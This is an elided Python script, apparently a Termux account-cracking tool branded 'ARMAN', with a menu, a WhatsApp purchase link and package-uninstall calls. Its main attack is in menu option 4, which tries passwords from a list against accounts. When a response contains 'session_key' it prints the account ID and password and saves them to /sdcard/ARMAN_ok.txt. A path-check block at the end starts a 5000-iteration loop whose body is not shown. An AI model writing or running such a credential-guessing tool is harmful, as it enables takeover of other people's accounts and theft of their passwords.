...
try:
        ...
        os.system('pip uninstall requests urllib3 idna TechQais')
        pass
...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+8801318805859?text={bumper}")
                        qsbuy()
...
def main():
        ...
        if menu_opt =='1':
                ...
                xchker()
                os.system('xdg-open https://github.com/Armanking2023')
                main()
        elif menu_opt =='4':
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[ARMAN -OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/ARMAN_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/ARMAN' in datar:
        pass
else:
        for i in range(5000):
